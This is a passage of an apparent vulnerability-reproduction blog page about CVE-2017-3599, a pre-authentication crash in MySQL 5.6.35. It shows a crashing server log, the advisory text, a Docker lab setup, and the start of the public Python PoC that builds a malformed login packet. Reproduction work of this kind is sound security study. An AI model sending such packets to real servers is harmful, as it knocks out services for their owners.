class=\"keyword\">for</span> more instructions.</span><br><span class=\"line\"></span><br><span class=\"line\">Please report any problems at http://bugs.mysql.com/</span><br><span class=\"line\"></span><br><span class=\"line\">The latest information about MySQL is available on the web at</span><br><span class=\"line\"></span><br><span class=\"line\">http://www.mysql.com</span><br><span class=\"line\"></span><br><span class=\"line\">Support MySQL by buying support/licenses at http://shop.mysql.com</span><br><span class=\"line\"></span><br><span class=\"line\">Note: new default config file not created.</span><br><span class=\"line\">Please make sure your config file is current</span><br><span class=\"line\"></span><br><span class=\"line\">WARNING: Default config file /etc/mysql/my.cnf exists on the system</span><br><span class=\"line\">This file will be <span class=\"built_in\">read</span> by default by the MySQL server</span><br><span class=\"line\">If you <span class=\"keyword\">do</span> not want to use this, either remove it, or use the</span><br><span class=\"line\">--defaults-file argument to mysqld_safe when starting the server</span><br><span class=\"line\"></span><br><span class=\"line\">Database initialized</span><br><span class=\"line\">MySQL init process <span class=\"keyword\">in</span> progress...</span><br><span class=\"line\">2023-12-19 12:19:40 0 [Note] mysqld (mysqld 5.6.35) starting as process 87 ...</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] Plugin <span class=\"string\">&#x27;FEDERATED&#x27;</span> is disabled.</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: Using atomics to ref count buffer pool pages</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: The InnoDB memory heap is disabled</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: Memory barrier is not used</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: Compressed tables use zlib 1.2.8</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: Using Linux native AIO</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: Not using CPU crc32 instructions</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: Initializing buffer pool, size = 128.0M</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: Completed initialization of buffer pool</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: Highest supported file format is Barracuda.</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: 128 rollback segment(s) are active.</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: Waiting <span class=\"keyword\">for</span> purge to start</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: 5.6.35 started; <span class=\"built_in\">log</span> sequence number 1625987</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Warning] No existing UUID has been found, so we assume that this is the first time that this server has been started. Generating a new UUID: e27a6a12-9e68-11ee-867c-0242ac110002.</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Warning] <span class=\"string\">&#x27;user&#x27;</span> entry <span class=\"string\">&#x27;root@100bfe039d09&#x27;</span> ignored <span class=\"keyword\">in</span> --skip-name-resolve mode.</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Warning] <span class=\"string\">&#x27;user&#x27;</span> entry <span class=\"string\">&#x27;@100bfe039d09&#x27;</span> ignored <span class=\"keyword\">in</span> --skip-name-resolve mode.</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Warning] <span class=\"string\">&#x27;proxies_priv&#x27;</span> entry <span class=\"string\">&#x27;@ root@100bfe039d09&#x27;</span> ignored <span class=\"keyword\">in</span> --skip-name-resolve mode.</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] Event Scheduler: Loaded 0 events</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] mysqld: ready <span class=\"keyword\">for</span> connections.</span><br><span class=\"line\">Version: <span class=\"string\">&#x27;5.6.35&#x27;</span>  socket: <span class=\"string\">&#x27;/var/run/mysqld/mysqld.sock&#x27;</span>  port: 0  MySQL Community Server (GPL)</span><br><span class=\"line\">Warning: Unable to load <span class=\"string\">&#x27;/usr/share/zoneinfo/iso3166.tab&#x27;</span> as time zone. Skipping it.</span><br><span class=\"line\">Warning: Unable to load <span class=\"string\">&#x27;/usr/share/zoneinfo/leap-seconds.list&#x27;</span> as time zone. Skipping it.</span><br><span class=\"line\">Warning: Unable to load <span class=\"string\">&#x27;/usr/share/zoneinfo/zone.tab&#x27;</span> as time zone. Skipping it.</span><br><span class=\"line\">2023-12-19 12:19:42 87 [Warning] <span class=\"string\">&#x27;proxies_priv&#x27;</span> entry <span class=\"string\">&#x27;@ root@100bfe039d09&#x27;</span> ignored <span class=\"keyword\">in</span> --skip-name-resolve mode.</span><br><span class=\"line\"></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] mysqld: Normal shutdown</span><br><span class=\"line\"></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Giving 0 client threads a chance to die gracefully</span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Event Scheduler: Purging the queue. 0 events</span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down slave threads</span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Forcefully disconnecting 0 remaining clients</span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Binlog end</span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;partition&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_SYS_DATAFILES&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_SYS_TABLESPACES&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_SYS_FOREIGN_COLS&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_SYS_FOREIGN&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_SYS_FIELDS&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_SYS_COLUMNS&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_SYS_INDEXES&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_SYS_TABLESTATS&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_SYS_TABLES&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_FT_INDEX_TABLE&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_FT_INDEX_CACHE&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_FT_CONFIG&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_FT_BEING_DELETED&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_FT_DELETED&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_FT_DEFAULT_STOPWORD&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_METRICS&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_BUFFER_POOL_STATS&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_BUFFER_PAGE_LRU&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_BUFFER_PAGE&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_CMP_PER_INDEX_RESET&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_CMP_PER_INDEX&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_CMPMEM_RESET&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_CMPMEM&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_CMP_RESET&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_CMP&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_LOCK_WAITS&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_LOCKS&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_TRX&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;InnoDB&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] InnoDB: FTS optimize thread exiting.</span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] InnoDB: Starting shutdown...</span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] InnoDB: Shutdown completed; <span class=\"built_in\">log</span> sequence number 1625997</span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class=\"string\">&#x27;BLACKHOLE&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class=\"string\">&#x27;ARCHIVE&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class=\"string\">&#x27;PERFORMANCE_SCHEMA&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class=\"string\">&#x27;MRG_MYISAM&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class=\"string\">&#x27;MyISAM&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class=\"string\">&#x27;CSV&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class=\"string\">&#x27;MEMORY&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class=\"string\">&#x27;sha256_password&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class=\"string\">&#x27;mysql_old_password&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class=\"string\">&#x27;mysql_native_password&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class=\"string\">&#x27;binlog&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] mysqld: Shutdown complete</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">MySQL init process <span class=\"keyword\">done</span>. Ready <span class=\"keyword\">for</span> start up.</span><br><span class=\"line\"></span><br><span class=\"line\">2023-12-19 12:19:44 0 [Note] mysqld (mysqld 5.6.35) starting as process 1 ...</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] Plugin <span class=\"string\">&#x27;FEDERATED&#x27;</span> is disabled.</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: Using atomics to ref count buffer pool pages</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: The InnoDB memory heap is disabled</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: Memory barrier is not used</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: Compressed tables use zlib 1.2.8</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: Using Linux native AIO</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: Not using CPU crc32 instructions</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: Initializing buffer pool, size = 128.0M</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: Completed initialization of buffer pool</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: Highest supported file format is Barracuda.</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: 128 rollback segment(s) are active.</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: Waiting <span class=\"keyword\">for</span> purge to start</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: 5.6.35 started; <span class=\"built_in\">log</span> sequence number 1625997</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] Server hostname (bind-address): <span class=\"string\">&#x27;*&#x27;</span>; port: 3306</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] IPv6 is available.</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note]   - <span class=\"string\">&#x27;::&#x27;</span> resolves to <span class=\"string\">&#x27;::&#x27;</span>;</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] Server socket created on IP: <span class=\"string\">&#x27;::&#x27;</span>.</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Warning] <span class=\"string\">&#x27;proxies_priv&#x27;</span> entry <span class=\"string\">&#x27;@ root@100bfe039d09&#x27;</span> ignored <span class=\"keyword\">in</span> --skip-name-resolve mode.</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] Event Scheduler: Loaded 0 events</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] mysqld: ready <span class=\"keyword\">for</span> connections.</span><br><span class=\"line\">Version: <span class=\"string\">&#x27;5.6.35&#x27;</span>  socket: <span class=\"string\">&#x27;/var/run/mysqld/mysqld.sock&#x27;</span>  port: 3306  MySQL Community Server (GPL)</span><br><span class=\"line\">12:21:29 UTC - mysqld got signal 11 ;</span><br><span class=\"line\">This could be because you hit a bug. It is also possible that this binary</span><br><span class=\"line\">or one of the libraries it was linked against is corrupt, improperly built,</span><br><span class=\"line\">or misconfigured. This error can also be caused by malfunctioning hardware.</span><br><span class=\"line\">We will try our best to scrape up some info that will hopefully <span class=\"built_in\">help</span></span><br><span class=\"line\">diagnose the problem, but since we have already crashed, </span><br><span class=\"line\">something is definitely wrong and this may fail.</span><br><span class=\"line\"></span><br><span class=\"line\">key_buffer_size=8388608</span><br><span class=\"line\">read_buffer_size=131072</span><br><span class=\"line\">max_used_connections=1</span><br><span class=\"line\">max_threads=151</span><br><span class=\"line\">thread_count=1</span><br><span class=\"line\">connection_count=1</span><br><span class=\"line\">It is possible that mysqld could use up to </span><br><span class=\"line\">key_buffer_size + (read_buffer_size + sort_buffer_size)*max_threads = 68108 K  bytes of memory</span><br><span class=\"line\">Hope that<span class=\"string\">&#x27;s ok; if not, decrease some variables in the equation.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Thread pointer: 0x23d86c0</span></span><br><span class=\"line\"><span class=\"string\">Attempting backtrace. You can use the following information to find out</span></span><br><span class=\"line\"><span class=\"string\">where mysqld died. If you see no messages after this, something went</span></span><br><span class=\"line\"><span class=\"string\">terribly wrong...</span></span><br><span class=\"line\"><span class=\"string\">stack_bottom = 7f3ca45a1e98 thread_stack 0x40000</span></span><br><span class=\"line\"><span class=\"string\">mysqld(my_print_stacktrace+0x2c)[0x8c3d5c]</span></span><br><span class=\"line\"><span class=\"string\">mysqld(handle_fatal_signal+0x481)[0x661df1]</span></span><br><span class=\"line\"><span class=\"string\">/lib/x86_64-linux-gnu/libpthread.so.0(+0xf890)[0x7f3ccee40890]</span></span><br><span class=\"line\"><span class=\"string\">/lib/x86_64-linux-gnu/libc.so.6(memchr+0x78)[0x7f3ccd885cd8]</span></span><br><span class=\"line\"><span class=\"string\">mysqld[0x672dc4]</span></span><br><span class=\"line\"><span class=\"string\">mysqld[0x683e2d]</span></span><br><span class=\"line\"><span class=\"string\">mysqld[0x68433e]</span></span><br><span class=\"line\"><span class=\"string\">mysqld[0x6730a9]</span></span><br><span class=\"line\"><span class=\"string\">mysqld[0x6724df]</span></span><br><span class=\"line\"><span class=\"string\">mysqld(_Z16acl_authenticateP3THDj+0x1bd)[0x68450d]</span></span><br><span class=\"line\"><span class=\"string\">mysqld[0x6abe17]</span></span><br><span class=\"line\"><span class=\"string\">mysqld(_Z16login_connectionP3THD+0x42)[0x6acbe2]</span></span><br><span class=\"line\"><span class=\"string\">mysqld(_Z22thd_prepare_connectionP3THD+0x19)[0x6ad329]</span></span><br><span class=\"line\"><span class=\"string\">mysqld(_Z24do_handle_one_connectionP3THD+0x11c)[0x6ad49c]</span></span><br><span class=\"line\"><span class=\"string\">mysqld(handle_one_connection+0x40)[0x6ad570]</span></span><br><span class=\"line\"><span class=\"string\">mysqld(pfs_spawn_thread+0x146)[0x8fa106]</span></span><br><span class=\"line\"><span class=\"string\">/lib/x86_64-linux-gnu/libpthread.so.0(+0x8064)[0x7f3ccee39064]</span></span><br><span class=\"line\"><span class=\"string\">/lib/x86_64-linux-gnu/libc.so.6(clone+0x6d)[0x7f3ccd8e962d]</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Trying to get some variables.</span></span><br><span class=\"line\"><span class=\"string\">Some pointers may be invalid and cause the dump to abort.</span></span><br><span class=\"line\"><span class=\"string\">Query (0): Connection ID (thread ID): 1</span></span><br><span class=\"line\"><span class=\"string\">Status: NOT_KILLED</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">The manual page at http://dev.mysql.com/doc/mysql/en/crashing.html contains</span></span><br><span class=\"line\"><span class=\"string\">information that should help you find out what is causing the crash.</span></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><p><a href=\"https://www.exploit-db.com/exploits/41954\">MySQL &lt; 5.6.35 &#x2F; &lt; 5.7.17 - Integer Overflow - Multiple dos Exploit</a></p>\n<h2 id=\"漏洞说明\"><a href=\"#漏洞说明\" class=\"headerlink\" title=\"漏洞说明\"></a>漏洞说明</h2><blockquote>\n<p>Vulnerability in the MySQL Server component of Oracle MySQL (subcomponent: Server: Pluggable Auth). Supported versions that are affected are 5.6.35 and earlier and 5.7.17 and earlier. Easily “exploitable” vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise MySQL Server. Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server. CVSS 3.0 Base Score 7.5 (Availability impacts). CVSS Vector: (CVSS:3.0&#x2F;AV:N&#x2F;AC:L&#x2F;PR:N&#x2F;UI:N&#x2F;S:U&#x2F;C:N&#x2F;I:N&#x2F;A:H). NOTE: the previous information is from the April 2017 CPU. Oracle has not commented on third-party claims that this issue is an integer overflow in sql&#x2F;auth&#x2F;sql_authentication.cc which allows remote attackers to cause a denial of service via a crafted authentication packet.</p>\n</blockquote>\n<h2 id=\"被测环境\"><a href=\"#被测环境\" class=\"headerlink\" title=\"被测环境\"></a>被测环境</h2><ul>\n<li>docker镜像：<code>mysql:5.6.35</code></li>\n<li>启动被测环境容器：<code>docker run -d -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 pmysql:5.6.35</code></li>\n</ul>\n<h2 id=\"POC脚本\"><a href=\"#POC脚本\" class=\"headerlink\" title=\"POC脚本\"></a>POC脚本</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># python2.7</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\"># Source: https://raw.githubusercontent.com/SECFORCE/CVE-2017-3599/master/cve-2017-3599_poc.py</span></span><br><span class=\"line\"><span class=\"string\"># Exploit Title: Remote MySQL DOS (Integer Overflow)</span></span><br><span class=\"line\"><span class=\"string\"># Google Dork: N/A</span></span><br><span class=\"line\"><span class=\"string\"># Date: 13th April 2017</span></span><br><span class=\"line\"><span class=\"string\"># Exploit Author: Rodrigo Marcos</span></span><br><span class=\"line\"><span class=\"string\"># Vendor Homepage: https://www.mysql.com/</span></span><br><span class=\"line\"><span class=\"string\"># Software Link: https://www.mysql.com/downloads/</span></span><br><span class=\"line\"><span class=\"string\"># Version: 5.6.35 and below / 5.7.17 and below</span></span><br><span class=\"line\"><span class=\"string\"># Tested on: N/A</span></span><br><span class=\"line\"><span class=\"string\"># CVE : CVE-2017-3599</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> socket </span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">CVE-2017-3599 Proof of Concept exploit code.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">https://www.secforce.com/blog/2017/04/cve-2017-3599-pre-auth-mysql-remote-dos/</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Rodrigo Marcos</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(sys.argv)&lt;<span class=\"number\">2</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;Usage: python &quot;</span> + sys.argv[<span class=\"number\">0</span>] + <span class=\"string\">&quot; host [port]&quot;</span></span><br><span class=\"line\">    exit(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    HOST = sys.argv[<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(sys.argv)&gt;<span class=\"number\">2</span>:</span><br><span class=\"line\">        PORT = <span class=\"built_in\">int</span>(sys.argv[<span class=\"number\">2</span>]) <span class=\"comment\"># Yes, no error checking... living on the wild side!</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        PORT = <span class=\"number\">3306</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;[+] Creating packet...&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">3 bytes\t\tPacket lenth</span></span><br><span class=\"line\"><span class=\"string\">1 bytes \tPacket number</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Login request:</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Packet format (when the server is 4.1 or newer):</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Bytes       Content</span></span><br><span class=\"line\"><span class=\"string\">-----       ----</span></span><br><span class=\"line\"><span class=\"string\">4           client capabilities</span></span><br><span class=\"line\"><span class=\"string\">4           max packet size</span></span><br><span class=\"line\"><span class=\"string\">1           charset number</span></span><br><span class=\"line\"><span class=\"string\">23          reserved (always 0)</span></span><br><span class=\"line\"><span class=\"string\">n           user name, \\0-terminated</span></span><br><span class=\"line\"><span class=\"string\">n           plugin auth data (e.g. scramble), length encoded</span></span><br><span class=\"line\"><span class=\"string\">n           database name, \\0-terminated</span></span><br><span class=\"line\"><span class=\"string\">            (if CLIENT_CONNECT_WITH_DB is set in the capabilities)</span></span><br><span class=\"line\"><span class=\"string\">n           client auth plugin name - \\0-terminated string,</span></span><br><span class=\"line\"><span class=\"string\">            (if CLIENT_PLUGIN_AUTH is set in the capabilities)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># packet_len = &#x27;\\x64\\x00\\x00&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">packet_num = <span class=\"string\">&#x27;\\x01&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Login request packet</span></span><br><span class=\"line\">packet_cap = <span class=\"string\">&#x27;\\x85\\xa2\\xbf\\x01&#x27;</span>\t\t<span class=\"comment\"># client capabilities (default)</span></span><br><span class=\"line\">packet_max = <span class=\"string\">&#x27;\\x00\\x00\\x00\\x01&#x27;</span>\t\t<span class=\"comment\"># max packet size (default)</span></span><br><span class=\"line\">packet_cset = <span class=\"string\">&#x27;\\x21&#x27;</span>\t\t\t\t<span class=\"comment\"># charset (default)</span></span><br><span class=\"line\">p_reserved = <span class=\"string\">&#x27;\\x00&#x27;</span> * <span class=\"number\">23</span> \t\t\t<span class=\"comment\"># 23 bytes reserved with nulls (default)</span></span><br><span class=\"line\">packet_usr =  <span class=\"string\">&#x27;test\\x00&#x27;</span> \t\t\t<span class=\"comment\"># username null terminated (default)</span></span><br><span class=\"line\"></span><br><span class=\"line\">packet_auth  = <span class=\"string\">&#x27;\\xff&#x27;</span>\t\t\t<span class=\"comment\"># both \\xff and \\xfe crash the server</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span 